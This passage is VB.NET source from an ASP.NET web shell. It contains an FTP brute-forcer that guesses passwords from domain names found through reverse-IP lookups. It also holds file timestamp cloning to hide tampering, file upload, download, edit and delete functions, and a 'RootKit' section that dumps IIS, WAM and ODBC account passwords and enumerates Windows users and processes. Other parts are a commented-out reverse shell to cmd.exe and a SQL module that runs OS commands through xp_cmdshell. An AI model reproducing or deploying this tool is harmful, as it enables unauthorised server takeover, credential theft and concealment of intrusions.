        Dim objStream As New StreamReader(objResponse.GetResponseStream())
        myDatabuffer = objStream.ReadToEnd()
        Do While myDatabuffer.IndexOf("nofollow") <> -1
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("nofollow") + 8)
            Dim website As String = myDatabuffer.Substring(2, myDatabuffer.IndexOf("</a>") - 2)
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("</a>") - 2)
            HostFromVnpower.Add(website)
        Loop
        Return HostFromVnpower
    End Function
    Public Function GetHostFromWhosonMyServer(ByVal http As String) As ArrayList
        Dim HostFromWhosonMyServer As New ArrayList()
        Dim myDatabuffer As String
        Dim sURL As String = "http://whosonmyserver.com/?s=" & http & "&submit=Lookup"
        Dim objNewRequest As WebRequest = HttpWebRequest.Create(sURL)
        Dim objResponse As WebResponse = objNewRequest.GetResponse
        Dim objStream As New StreamReader(objResponse.GetResponseStream())
        myDatabuffer = objStream.ReadToEnd()
        Do While myDatabuffer.IndexOf("<tr><td>") <> -1
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("<tr><td>") + 8)
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("http://") + 7)
            Dim website As String = myDatabuffer.Substring(0, myDatabuffer.IndexOf("/"))
            myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("/"))
            HostFromWhosonMyServer.Add(website)
        Loop
        Return HostFromWhosonMyServer
    End Function
    Sub RunFtpBrute(ByVal Src As Object, ByVal E As EventArgs)
        Dim mypassword As String = ""
        If IpAddress.Text <> "" Then
            Dim Ftptrue, Ftpfalse As String
            Ftptrue = ""
            Ftpfalse = ""
            resultFtpBrute.Text = ""
            If (CheckPort(IpAddress.Text, 21) <> False) Then
                resultFtpBrute.Text = "<table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Password<b></font></td><td align=center><font color=white><b>IpAddress<b></font></td><td align=center><font color=white><b>Websites<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
                If DropDownListReverseIp.SelectedItem.Value <> "localhost" Then
                    Dim webhosting As New ArrayList
                    If (DropDownListReverseIp.SelectedItem.Value = "www.whosonmyserver.com") Then
                        webhosting = GetHostFromWhosonMyServer(IpAddress.Text)
                    End If
                    If (DropDownListReverseIp.SelectedItem.Value = "www.vnpower.org") Then
                        webhosting = GetHostFromVnpower(IpAddress.Text)
                    End If
                    For Each website As String In webhosting
                        Dim websitename As String = website
                        If website.IndexOf("www.") <> -1 Then
                            website = website.Substring(website.IndexOf("www.") + 4)
                        End If
                        If CheckBoxPeer.Checked Then
                            mypassword = website.Substring(0, website.IndexOf("."))
                        Else
                            If website.IndexOf(".") <> -1 Then
                                website = website.Substring(0, website.IndexOf("."))
                                mypassword = website
                            End If
                        End If
                
                        If ConcatUser.Text <> "" Then
                            website = website & ConcatUser.Text
                        End If
                        If CheckPassword.Text <> "" Then
                            mypassword = CheckPassword.Text
                        Else
                            If Concat.Text <> "" Then
                                If CheckBoxAtHomeUser.Checked Then
                                    mypassword = Concat.Text & mypassword
                                Else
                                    mypassword = mypassword & Concat.Text
                                End If
                            End If
                        End If
                        If CheckBoxRemove.Checked Then
                            If CheckRemove.Text <> "" Then
                                website = website.Replace(CheckRemove.Text, "")
                            End If
                        End If
                        If CheckBoxReverseFtp.Checked Then
                            mypassword = StrReverse(mypassword)
                        End If
                        If (CheckFtp(IpAddress.Text, website, mypassword) <> False) Then
                            Ftptrue &= "<tr>"
                            Ftptrue &= "<td><b>" & website & "</b></td>"
                            Ftptrue &= "<td><center>" & mypassword & "</center></td>"
                            Ftptrue &= "<td><center>" & IpAddress.Text & "</center></td>"
                            Ftptrue &= "<td><center>" & websitename & "</center></td>"
                            Ftptrue &= "<td><center><font color=red><b>True </b></font></center></td>"
                            Ftptrue &= "</tr>"
                        Else
                            Ftpfalse &= "<tr>"
                            Ftpfalse &= "<td><b>" & website & "</b></td>"
                            Ftpfalse &= "<td><center>" & mypassword & "</center></td>"
                            Ftpfalse &= "<td><center>" & IpAddress.Text & "</center></td>"
                            Ftpfalse &= "<td><center>" & websitename & "</center></td>"
                            Ftpfalse &= "<td><center>False </center></td>"
                            Ftpfalse &= "</tr>"
                        End If
                    Next
                Else
                    Try
                        Dim UserName As New ArrayList
                        If CheckBoxRemotlyBrute.Checked Then
                            UserName = GetUserFromRemotlyServer(IpAddress.Text, TextBoxNameBrute.Text, TextBoxPasswordBrute.Text)
                        Else
                            UserName = GetUserFromLocalhost(IpAddress.Text)
                        End If
                        For Each UserTest As String In UserName
                            If UserTest.IndexOf(".") <> -1 Then
                                mypassword = UserTest.Substring(0, UserTest.IndexOf("."))
                            Else
                                mypassword = UserTest
                            End If
                            If CheckPassword.Text <> "" Then
                                mypassword = CheckPassword.Text
                            Else
                                If Concat.Text <> "" Then
                                    If CheckBoxAtHomeUser.Checked Then
                                        mypassword = Concat.Text & mypassword
                                    Else
                                        mypassword = mypassword & Concat.Text
                                    End If
                                End If
                            End If
                            If CheckBoxRemove.Checked Then
                                If CheckRemove.Text <> "" Then
                                    mypassword = mypassword.Replace(CheckRemove.Text, "")
                                End If
                            End If
                            If CheckBoxReverseFtp.Checked Then
                                mypassword = StrReverse(mypassword)
                            End If
                            If (CheckFtp(IpAddress.Text, UserTest, mypassword) <> False) Then
                                Ftptrue &= "<tr>"
                                Ftptrue &= "<td><b>" & UserTest & "</b></td>"
                                Ftptrue &= "<td><center>" & mypassword & "</center></td>"
                                Ftptrue &= "<td><center>" & IpAddress.Text & "</center></td>"
                                Ftptrue &= "<td><center>" & IpAddress.Text & "</center></td>"
                                Ftptrue &= "<td><center><font color=red><b>True </b></font></center></td>"
                            Else
                                Ftpfalse &= "<tr>"
                                Ftpfalse &= "<td><b>" & UserTest & "</b></td>"
                                Ftpfalse &= "<td><center>" & mypassword & "</center></td>"
                                Ftpfalse &= "<td><center>" & IpAddress.Text & "</center></td>"
                                Ftpfalse &= "<td><center>" & IpAddress.Text & "</center></td>"
                                Ftpfalse &= "<td><center>False </center></td>"
                                Ftpfalse &= "</tr>"
                            End If
                        Next
                    Catch
                    End Try
                End If
                resultFtpBrute.Text &= Ftptrue & Ftpfalse & "</table>"
            Else
                resultFtpBrute.Text &= "<hr><b>ip " & IpAddress.Text & ":21" & ".........close</b>"
            End If
        End If
    End Sub

    Sub CloneTime(ByVal Src As Object, ByVal E As EventArgs)
        existdir(time1.Text)
        existdir(time2.Text)
        Dim thisfile As FileInfo = New FileInfo(time1.Text)
        Dim thatfile As FileInfo = New FileInfo(time2.Text)
        thisfile.LastWriteTime = thatfile.LastWriteTime
        thisfile.LastAccessTime = thatfile.LastAccessTime
        thisfile.CreationTime = thatfile.CreationTime
        Response.Write("<font color=""red"">Clone Time Success!</font>")
    End Sub
    Sub Editor(ByVal Src As Object, ByVal E As EventArgs)
        Dim mywrite As New StreamWriter(filepath.Text, False, Encoding.Default)
        mywrite.Write(content.Text)
        mywrite.Close()
        Response.Write("<script>alert('Edit|Creat " & Replace(filepath.Text, "\", "\\") & " Success!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(Getparentdir(filepath.Text)) & "'</sc" & "ript>")
    End Sub
    Sub DownloadFileRemote(ByVal Src As Object, ByVal E As EventArgs)
        Dim filename, loadpath As String
        filename = downloadfile.Text
        loadpath = Request.QueryString("src") & SaveAsFile.Text
        If File.Exists(loadpath) = True Then
            Response.Write("<script>alert('File " & Replace(loadpath, "\", "\\") & " have existed , download fail!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(Request.QueryString("src")) & "'</sc" & "ript>")
            Response.End()
        End If
        Try
            Dim objNewRequest As WebRequest = HttpWebRequest.Create(filename)
            Dim objResponse As WebResponse = objNewRequest.GetResponse
            Dim objStream As Stream = objResponse.GetResponseStream()
            Dim objlength As Integer = objResponse.ContentLength
            Dim objbytes(objlength) As Byte
            For i As Integer = 0 To objlength - 1
                objbytes(i) = objStream.ReadByte()
            Next
            Dim objoutput As New FileStream(loadpath, FileMode.OpenOrCreate, FileAccess.Write)
            objoutput.Write(objbytes, 0, objbytes.Length)
            objoutput.Close()
            Response.Write("<script>alert('File " & filename & " download success!\nFile info:\n\nClient Path:" & Replace(downloadfile.Text, "\", "\\") & "\nFile Size:" & objlength & " bytes\nSave Path:" & Replace(loadpath, "\", "\\") & "\n');")
            Response.Write("location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(Request.QueryString("src")) & "'</sc" & "ript>")
        Catch ex As Exception
            Response.Write("<script>alert('File " & Replace(loadpath, "\", "\\") & " Access Denied , download fail!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(Request.QueryString("src")) & "'</sc" & "ript>")
            Response.End()
        End Try
    End Sub
    Sub UpLoad(ByVal Src As Object, ByVal E As EventArgs)
        Dim filename, loadpath As String
        filename = Path.GetFileName(UpFile.Value)
        loadpath = Request.QueryString("src") & filename
        If File.Exists(loadpath) = True Then
            Response.Write("<script>alert('File " & Replace(loadpath, "\", "\\") & " have existed , upload fail!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(Request.QueryString("src")) & "'</sc" & "ript>")
            Response.End()
        End If
        UpFile.PostedFile.SaveAs(loadpath)
        Response.Write("<script>alert('File " & filename & " upload success!\nFile info:\n\nClient Path:" & Replace(UpFile.Value, "\", "\\") & "\nFile Size:" & UpFile.PostedFile.ContentLength & " bytes\nSave Path:" & Replace(loadpath, "\", "\\") & "\n');")
        Response.Write("location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(Request.QueryString("src")) & "'</sc" & "ript>")
    End Sub
    Sub NewFD(ByVal Src As Object, ByVal E As EventArgs)
        url = Request.Form("src")
        If NewFile.Checked = True Then
            Dim mywrite As New StreamWriter(url & NewName.Text, False, Encoding.Default)
            mywrite.Close()
            Response.Redirect(Request.ServerVariables("URL") & "?action=edit&src=" & Server.UrlEncode(url & NewName.Text))
        Else
            Directory.CreateDirectory(url & NewName.Text)
            Response.Write("<script>alert('Creat directory " & Replace(url & NewName.Text, "\", "\\") & " Success!');location.href='" & Request.ServerVariables("URL") & "?action=goto&src=" & Server.UrlEncode(url) & "'</sc" & "ript>")
        End If
    End Sub
    Sub del(ByVal a)
        If Right(a, 1) = "\" Then
            Dim xdir As DirectoryInfo
            Dim mydir As New DirectoryInfo(a)
            Dim xfile As FileInfo
            For Each xfile In mydir.GetFiles()
                File.Delete(a & xfile.Name)
            Next
            For Each xdir In mydir.GetDirectories()
                Call del(a & xdir.Name & "\")
            Next
            Directory.Delete(a)
        Else
            File.Delete(a)
        End If
    End Sub
    Sub copydir(ByVal a, ByVal b)
        Dim xdir As DirectoryInfo
        Dim mydir As New DirectoryInfo(a)
        Dim xfile As FileInfo
        For Each xfile In mydir.GetFiles()
            File.Copy(a & "\" & xfile.Name, b & xfile.Name)
        Next
        For Each xdir In mydir.GetDirectories()
            Directory.CreateDirectory(b & Path.GetFileName(a & xdir.Name))
            Call copydir(a & xdir.Name & "\", b & xdir.Name & "\")
        Next
    End Sub
    Sub xexistdir(ByVal temp, ByVal ow)
        If Directory.Exists(temp) = True Or File.Exists(temp) = True Then
            If ow = 0 Then
                Response.Redirect(Request.ServerVariables("URL") & "?action=samename&src=" & Server.UrlEncode(url))
            ElseIf ow = 1 Then
                del(temp)
            Else
                Dim d As String = Session("cutboard")
                If Right(d, 1) = "\" Then
                    TEMP1 = url & Second(Now) & Path.GetFileName(Mid(Replace(d, "", ""), 1, Len(Replace(d, "", "")) - 1))
                Else
                    TEMP2 = url & Second(Now) & Replace(Path.GetFileName(d), "", "")
                End If
            End If
        End If
    End Sub
    Sub existdir(ByVal temp)
        If File.Exists(temp) = False And Directory.Exists(temp) = False Then
            Response.Write("<script>alert('Don\'t exist " & Replace(temp, "\", "\\") & " ! Is it a CD-ROM ?');</sc" & "ript>")
            Response.Write("<br><br><a href='javascript:history.back(1);'>Click Here Back</a>")
            Response.End()
        End If
    End Sub
    Sub ShowDetails(ByVal ShowWAM, ByVal Header, ByVal OBJ, ByVal ArgComputer, ByVal ArgUser, ByVal ArgPassword)
        Dim objWebApp, strBindings, objServiceFtp, objServerFtp, oADSIObject
        On Error Resume Next
        LabelRootKit.Text &= "<br>" & Header & "<br>"
        LabelRootKit.Text &= "  Annonymous user name             : " & OBJ.AnonymousUserName & "<br>"
        LabelRootKit.Text &= "  Annonymous user account password : " & Server.UrlEncode(OBJ.AnonymousUserPass) & "<br>"
        LabelRootKit.Text &= "Path : <a href=" + Request.ServerVariables("PATH_INFO") + "?action=goto&src=" + Server.UrlEncode(OBJ.Path) + "\&username=" + Server.UrlEncode(OBJ.AnonymousUserName) + "&password=" + Server.UrlEncode(OBJ.AnonymousUserPass) + ">" + OBJ.Path + "\</a><br>"

        'LabelRootKit.Text &= "  App Pool : " & OBJ.AppPoolId
        ' LabelRootKit.Text &= "  Path : " & OBJ.Path & "<br>"
        'LabelRootKit.Text &= "  Class : " & OBJ.Class
        oADSIObject = GetObject("IIS:")
        objWebApp = oADSIObject.OpenDSObject("IIS://" & ArgComputer & "/" & Header, ArgUser, ArgPassword, 0)
        'objWebApp = GetObject("IIS://localhost/" & Header)
        'LabelRootKit.Text &= "  name objWebApp: " & objWebApp.Class
        If (objWebApp.Class = "IIsWebServer") Or (objWebApp.Class = "IIsFtpServer") Then
            LabelRootKit.Text &= "  Site ID : " & objWebApp.Name & "<br>"
            LabelRootKit.Text &= "  Comment : " & objWebApp.ServerComment & "<br>"
            LabelRootKit.Text &= "  State   : " & State2Desc(objWebApp.ServerState) & "<br>"
            LabelRootKit.Text &= "  LogDir  : " & objWebApp.LogFileDirectory & "<br>"
            LabelRootKit.Text &= "  Domain  : " & objWebApp.Get("ServerBindings")(0) & "<br>"
		
            ' Enumerate the HTTP bindings (ServerBindings) and
            ' SSL bindings (SecureBindings) for HTTPS only
            strBindings = EnumBindings(objWebApp.ServerBindings)

            ' IF strServerType = "Web" THEN
            strBindings = strBindings & _
            EnumBindings(objWebApp.SecureBindings)
            ' END IF

            If Not strBindings = "" Then
                LabelRootKit.Text &= "  IP Address" & vbTab & _
                             "  Port" & vbTab & _
                             "  Host" & vbCrLf & _
                             strBindings
            End If
			
            If (objWebApp.Class = "IIsFtpServer") Then
                LabelRootKit.Text &= "  Enumerating VirtualDir" & "<br>"
                objServiceFtp = oADSIObject.OpenDSObject("IIS://" & ArgComputer & "/" & Header & "/ROOT", ArgUser, ArgPassword, 0)
                For Each objServerFtp In objServiceFtp
			
                    LabelRootKit.Text &= _
                       "  Name = " & objServerFtp.name & "<br>" & _
                       "  Path = " & objServerFtp.Path & "<br>" & _
                    "  AccessFlags = " & objServerFtp.UNCUserName & "<br>" & _
                                "<br>"
                Next
            End If
        End If
        objWebApp = Nothing
	
        If (ShowWAM = True) Then
            LabelRootKit.Text &= ""
            LabelRootKit.Text &= "  WAM user name                    : " & OBJ.WAMUserName & "<br>"
            LabelRootKit.Text &= "  WAM password                     : " & OBJ.WAMuserPass & "<br>"
        End If
        LabelRootKit.Text &= ""
        LabelRootKit.Text &= "  ODBC username                    : " & OBJ.LogOdbcUserName & "<br>"
        LabelRootKit.Text &= "  ODBC password                    : " & OBJ.LogOdbcPassword & "<br>"
        LabelRootKit.Text &= "<br>"
    End Sub
    Function EnumBindings(ByVal objBindingList)

    End Function

    Function State2Desc(ByVal nState)
        Select Case nState
            Case 1
                State2Desc = "Starting (MD_SERVER_STATE_STARTING)"
            Case 2
                State2Desc = "Started (MD_SERVER_STATE_STARTED)"
            Case 3
                State2Desc = "Stopping (MD_SERVER_STATE_STOPPING)"
            Case 4
                State2Desc = "Stopped (MD_SERVER_STATE_STOPPED)"
            Case 5
                State2Desc = "Pausing (MD_SERVER_STATE_PAUSING)"
            Case 6
                State2Desc = "Paused (MD_SERVER_STATE_PAUSED)"
            Case 7
                State2Desc = "Continuing (MD_SERVER_STATE_CONTINUING)"
            Case Else
                State2Desc = "Unknown state"
        End Select
    End Function

    Sub DoObject(ByVal ObjectName, ByVal Objectclass, ByVal ArgComputer, ByVal ArgUser, ByVal ArgPassword)
        Dim FullPath, IISOBJ1, IISOBJ2, IISOBJ3, IISOBJ4, Server1, Server2, Server3, oADSIObject
        FullPath = "IIS://" & ArgComputer & "/" & ObjectName
        oADSIObject = GetObject("IIS:")
        Try
            IISOBJ1 = oADSIObject.OpenDSObject(FullPath, ArgUser, ArgPassword, 0)
            'IISOBJ = getObject(FullPath)
            If (ObjectName <> "W3SVC") Then
                ShowDetails(False, ObjectName, IISOBJ1, ArgComputer, ArgUser, ArgPassword)
            Else
                ShowDetails(True, ObjectName, IISOBJ1, ArgComputer, ArgUser, ArgPassword)
            End If
            For Each Server1 In IISOBJ1
                If (Server1.Class = Objectclass) Then
                    If (ObjectName = "W3SVC") Then
                        FullPath = "IIS://" & ArgComputer & "/" & ObjectName & "/" & Server1.Name & "/ROOT"
                    Else
                        FullPath = "IIS://" & ArgComputer & "/" & ObjectName & "/" & Server1.Name
                    End If
                    IISOBJ2 = oADSIObject.OpenDSObject(FullPath, ArgUser, ArgPassword, 0)
                    'IISOBJ1 = GetObject(FullPath)
                    ShowDetails(False, ObjectName & "/" & Server1.Name, IISOBJ2, ArgComputer, ArgUser, ArgPassword)
                    For Each Server2 In IISOBJ2
                        IISOBJ3 = oADSIObject.OpenDSObject(FullPath & "/" & Server2.Name, ArgUser, ArgPassword, 0)
                        For Each Server3 In IISOBJ3
                            IISOBJ4 = oADSIObject.OpenDSObject(FullPath & "/" & Server2.Name & "/" & Server3.Name, ArgUser, ArgPassword, 0)
                            ShowDetails(False, ObjectName & "/" & Server1.Name & "/" & Server2.Name & "/" & Server3.Name, IISOBJ4, ArgComputer, ArgUser, ArgPassword)
                        Next
                    Next
                    IISOBJ2 = Nothing
                End If
            Next
        Catch ex As Exception
            'LabelRootKit.Text &= ex.Message
            LabelRootKit.Text &= "Unable to access object : " & ObjectName & " on computer: " & ArgComputer & vbCrLf & "<br>"
        End Try
        IISOBJ1 = Nothing
    End Sub
    Sub RunAdminRootKit(ByVal Src As Object, ByVal E As EventArgs)
        LabelRootKit.Text = "<hr><b>"
        If CheckBoxMSFTPSVC.Checked Then
            Call DoObject("MSFTPSVC", "IIsFtpServer", HostRootKit.Text, UserRootKit.Text, PasswordRootKit.Text)
        End If
        If CheckBoxNNTPSVC.Checked Then
            Call DoObject("NNTPSVC", "IIsNNTPServer", HostRootKit.Text, UserRootKit.Text, PasswordRootKit.Text)
        End If
        If CheckBoxW3SVC.Checked Then
            Call DoObject("W3SVC", "IIsWebServer", HostRootKit.Text, UserRootKit.Text, PasswordRootKit.Text)
        End If
        If CheckBoxNETUSER.Checked Then
            Dim oADSIObject, oIADs, oContainer, lastlogin, Passwordlastset
            oADSIObject = GetObject("WinNT:")
            Try
                oContainer = oADSIObject.OpenDSObject("WinNT://" & HostRootKit.Text & "", UserRootKit.Text, PasswordRootKit.Text, 0)
                LabelRootKit.Text &= "Enumertation Users<br>"
                For Each oIADs In oContainer
                    If (oIADs.Class = "User") Then
                        Try
                            lastlogin = oIADs.lastlogin.ToString()
                        Catch
                            lastlogin = "Never"
                        End Try
                        Passwordlastset = DateAdd("s", -oIADs.PasswordAge, Now())
                        LabelRootKit.Text &= "  User Name : " & oIADs.Name & "<br>"
                        LabelRootKit.Text &= "  Full Name : " & oIADs.fullname & "<br>"
                        LabelRootKit.Text &= "  Comment : " & oIADs.description & "<br>"
                        LabelRootKit.Text &= "  Home directory : " & oIADs.HomeDirectory & "<br>"
                        LabelRootKit.Text &= "  Last logon : " & lastlogin & "<br>"
                        LabelRootKit.Text &= "  Password last set : " & FormatDateTime(Passwordlastset, 3).ToString() & " " & FormatDateTime(Passwordlastset, 2).ToString() & " " & FormatDateTime(Passwordlastset, 1).ToString() & "<br><br>"
                    End If
                Next
            Catch
                LabelRootKit.Text &= "Unable to access object : " & "WinNT://" & " on computer: " & HostRootKit.Text & "<br>"
            End Try
        End If
    
 
        Try
            Dim WinNT As String = "WinNT://" & HostRootKit.Text
            Dim mydir As New DirectoryEntry(WinNT, UserRootKit.Text, PasswordRootKit.Text, 0)
            For Each child As DirectoryEntry In mydir.Children
                ' If (childEntry.SchemaClassName = "Service") Then
                '  Response.Write(child.SchemaClassName.ToString())
                '   Response.Write("<br>")
                '  End If
            Next
        Catch
        End Try
                
    
        If HostRootKit.Text <> "" Then
            If CommandRootKit.Text <> "" Then
            End If
        End If
    
        Try
            Dim IIsComputerObj, item, objWMIService, colComputer, objComputer, nodeObj
            IIsComputerObj = CreateObject("WbemScripting.SWbemLocator")             ' Create an instance of the IIsComputer object
            objWMIService = IIsComputerObj.ConnectServer(HostRootKit.Text, "root/cimv2", UserRootKit.Text, PasswordRootKit.Text)
            objWMIService.Security_.impersonationlevel = 3
            colComputer = objWMIService.ExecQuery("Select * from Win32_Process")
            For Each objComputer In colComputer
                LabelRootKit.Text &= "user: " & objComputer.CommandLine & "<br>"
            Next
        Catch
            ' UserFromLocalhost.Add("nouser")
        End Try
    End Sub
    
    Public Sub RunServer()
        'LabelReverseConnection.Text = ""
        'tcpClient = New TcpClient()
        'strInput = New StringBuilder()
        'If Not tcpClient.Connected Then
        ' Try
        ' tcpClient.Connect(IpReverseConnection.Text, PortReverseConnection.Text)
        ' networkStream = tcpClient.GetStream()
        ' streamReader = New StreamReader(networkStream)
        ' streamWriter = New StreamWriter(networkStream)
        '  Catch ex As Exception
        'LabelReverseConnection.Text = ex.Message
        'End Try
        'processCmd = New Process()
        'processCmd.StartInfo.FileName = "cmd.exe"
        'processCmd.StartInfo.CreateNoWindow = True
        'processCmd.StartInfo.UseShellExecute = False
        'processCmd.StartInfo.RedirectStandardOutput = True
        'processCmd.StartInfo.RedirectStandardInput = True
        'processCmd.StartInfo.RedirectStandardError = True
        'AddHandler processCmd.OutputDataReceived, AddressOf CmdOutputDataHandler
        'processCmd.Start()
        'processCmd.BeginOutputReadLine()
        'End If
        'While True
        ' processCmd.StandardInput.WriteLine(strInput)
        'strInput.Remove(0, strInput.Length)
        'End While
    End Sub
    Sub RunReverseConnection(ByVal Src As Object, ByVal E As EventArgs)
        '   While (True)
        'RunServer()
        'Wait 5 seconds
        'System.Threading.Thread.Sleep(5000)
        'End While    
    End Sub
    '   Private Sub CmdOutputDataHandler(ByVal sendingProcess As Object, ByVal outLine As DataReceivedEventArgs)
    'Dim strOutput As New StringBuilder()
    '   If Not [String].IsNullOrEmpty(outLine.Data) Then
    '      Try
    '         strOutput.Append(outLine.Data)
    '        StreamWriter.WriteLine(strOutput)
    '       StreamWriter.Flush()
    '  Catch ex As Exception
    '     LabelReverseConnection.Text = ex.Message
    'End Try
    'End If
    'End Sub
    
    Sub RunftpConnect(ByVal Src As Object, ByVal E As EventArgs)
        '    If ftpServerIP.Text <> "" Then
        '        LabelFtpSwitch.Text = ""
        '        Dim result As StringBuilder = New StringBuilder()
        '        Try
        '            Dim reqFTP As FtpWebRequest = DirectCast(FtpWebRequest.Create(New Uri("ftp://" & ftpServerIP.Text & ftproot.Text)), FtpWebRequest)
        '            reqFTP.UseBinary = True
        '            reqFTP.Credentials = New NetworkCredential(ftpUserID.Text, ftpPassword.Text)
        '            reqFTP.Method = WebRequestMethods.Ftp.ListDirectory
        '            Dim responseweb As WebResponse = reqFTP.GetResponse()
        '            Dim reader As StreamReader = New StreamReader(responseweb.GetResponseStream())
        '            LabelFtpSwitch.Text += "<hr>"
        '            LabelFtpSwitch.Text += "<table width='100%'  border='1' align='center'>"
        '            LabelFtpSwitch.Text += "<tr>"
        '            LabelFtpSwitch.Text += "<td width='50%'><strong>local</strong></td>"
        '            LabelFtpSwitch.Text += "<td width='50%'><strong>remote</strong></td>"
        '            LabelFtpSwitch.Text += "</tr>"
        '            Dim line As String = reader.ReadLine()
        '            Do While line IsNot Nothing
        '                LabelFtpSwitch.Text += "<tr>"
        '                LabelFtpSwitch.Text += "<td>"
        '                LabelFtpSwitch.Text += "<a href='?action=downremote&src=" & ftproot.Text & "/" & line & "&path=" & Server.UrlEncode(url) & "' onClick='return down(this);'>Download</a>|<a href='?action=delremote&src=" & ftproot.Text & "/" & line & "' onClick='return del(this);'>Del</a>"
        '                LabelFtpSwitch.Text += "</td>"
        '                LabelFtpSwitch.Text += "</tr>"
        '                line = reader.ReadLine()
        '            Loop
        '            LabelFtpSwitch.Text += "</table>"
        '            responseweb.Close()
        '            reader.Close()
        '            
        '        Catch ex As Exception
        '            Response.Write(ex.Message)
        '        End Try
        '    End If
    End Sub
    Sub RunSQLCMD(ByVal Src As Object, ByVal E As EventArgs)
        Dim adoConn, strQuery, recResult, strResult, arrResults, Number_Of_Fields, Number_Of_Records, A, R, F
        strResult = ""
        resultSQL.Text = ""
        If SqlName.Text <> "" Then
            Try
                adoConn = Server.CreateObject("ADODB.Connection")
                adoConn.Open("Provider=SQLOLEDB.1;Password=" & SqlPass.Text & ";UID=" & SqlName.Text & ";Data Source = " & ip.Text)
                If Sqlcmd.Text <> "" Then
                    If InStr(Sqlcmd.Text, "select") Then
                        recResult = adoConn.Execute(Sqlcmd.Text)
                        If Not recResult.EOF Then
                            arrResults = recResult.GetRows()
                            Number_Of_Fields = CDbl(UBound(arrResults, 1))
                            Number_Of_Records = CDbl(UBound(arrResults, 2))
                            strResult = "<table border='3' width ='' height=''><tr bgcolor=black>"
                            For A = 0 To Number_Of_Fields
                                strResult += "<td align=center><font color=white><b>"
                                strResult += recResult.Fields(A).Name
                                strResult += "<b></font></td>"
                            Next
                            strResult += "</tr>"
                            For R = 0 To Number_Of_Records
                                strResult += "<tr>"
                                For F = 0 To Number_Of_Fields
                                    strResult += "<td>" & arrResults(F, R).ToString()
                                    strResult += "</td>"
                                Next
                                strResult += "</tr>"
                            Next
                            strResult += "</table>"
                        End If
                        recResult = Nothing
                        '  strResult = Replace(strResult, " ", "&nbsp;")
                        '  strResult = Replace(strResult, "<", "<")
                        '  strResult = Replace(strResult, ">", ">")
                        resultSQL.Text = Sqlcmd.Text & strResult
                        Sqlcmd.Text = ""
                    Else
                        strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'"
                        recResult = adoConn.Execute(strQuery)
                        If Not recResult.EOF Then
                            Do While Not recResult.EOF
                                strResult = strResult & Chr(13) & recResult(0).value
                                recResult.MoveNext()
                            Loop
                        End If
                        recResult = Nothing
                        strResult = Replace(strResult, " ", "&nbsp;")
                        strResult = Replace(strResult, "<", "<")
                        strResult = Replace(strResult, ">", ">")
                        resultSQL.Text = Sqlcmd.Text & vbCrLf & "<pre>" & strResult & "</pre>"
                        Sqlcmd.Text = ""
                    End If
                Else
                    strQuery = "select @@version"
                    recResult = adoConn.Execute(strQuery)
                    If Not recResult.EOF Then
                        Do While Not recResult.EOF
                            strResult = strResult & Chr(13) & recResult(0).value
                            recResult.MoveNext()
                        Loop
                    End If
                    recResult = Nothing
                    strResult = Replace(strResult, " ", "&nbsp;")
                    strResult = Replace(strResult, "<", "<")
                    strResult = Replace(strResult, ">", ">")
                    strResult = Replace(strResult, "NT&nbsp;5.0", "2000")
                    strResult = Replace(strResult, "NT&nbsp;5.1", "XP")
                    strResult = Replace(strResult, "NT&nbsp;5.2", "2003")
					
                    strQuery = "select * from master.dbo.sysobjects"
                    'strQuery="select name,xtype from master.dbo.sysobjects"
                    recResult = adoConn.Execute(strQuery)
                    Dim objField
                    For Each objField In recResult.Fields
                        strResult = strResult & Chr(13) & objField.Name
                    Next
						
                    '			If Not recResult.EOF Then
                    '               Do While Not recResult.EOF
                    '                  strResult = strResult & Chr(13) & recResult(0).value
                    '                 recResult.MoveNext()
                    '            Loop
                    '       End If
                    recResult = Nothing
					
                    strQuery = "exec xp_regread HKEY_LOCAL_MACHINE,'SOFTWARE\PLESK\Installer\MSDE','meta'"
                    recResult = adoConn.Execute(strQuery)
                    If Not recResult.EOF Then
                        Do While Not recResult.EOF
                            strResult = strResult & Chr(13) & recResult(0).value & "-" & recResult(1).value
                            recResult.MoveNext()
                        Loop
                    End If
                    recResult = Nothing
					
                    resultSQL.Text = Sqlcmd.Text & vbCrLf & "<pre>" & strResult & "</pre>"
                    Sqlcmd.Text = ""
                End If
                adoConn.Close()
            Catch ex As Exception
                resultSQL.Text = "<pre>" & ex.Message & "</pre>"
            End Try
            
        End If
    End Sub
    Sub RunDbManager(ByVal Src As Object, ByVal E As EventArgs)
        Dim adoConn, strQuery, recResult, strResult, strTableType, adoRs
        LabelDbManager.Text = ""
        If SqlName.Text <> "" Then
            Try
                adoConn = Server.CreateObject("ADODB.Connection")
                adoRs = Server.CreateObject("ADODB.Recordset")
				
                ' DbManagerDriver.Text = "PROVIDER=Microsoft.Jet.OLEDB.4.0"
                'adoConn.ConnectionString = DbManagerDriver.Text & ";DATA SOURCE=" & DbManagerDatabase.Text & ";Jet OLEDB:Database Password=" & DbManagerPass.Text
                adoConn.ConnectionString = DbManagerDriver.Text + ";server=" + DbManagerServerName.Text + ";uid=" + DbManagerUserName.Text + ";pwd=" + DbManagerPass.Text + ";DBQ=" + DbManagerDatabase.Text
                ' adoConn.ConnectionString= DbManagerDriver.Text + ";server=" + DbManagerServerName.Text + ";uid=" + DbManagerUserName.Text + ";pwd=" + DbManagerPass.Text + ";database=" + DbManagerDatabase.Text
               			   
                ' DbManagerDriver.Text = "Provider=SQLOLEDB.1"
                'adoConn.ConnectionString = DbManagerDriver.Text & ";Password=" & DbManagerPass.Text & ";UID=" & DbManagerUserName.Text & ";Database=" & DbManagerDatabase.Text & ";Data Source = " & DbManagerServerName.Text
                adoConn.Open()
                If DbManagerTable.Text <> "" Then
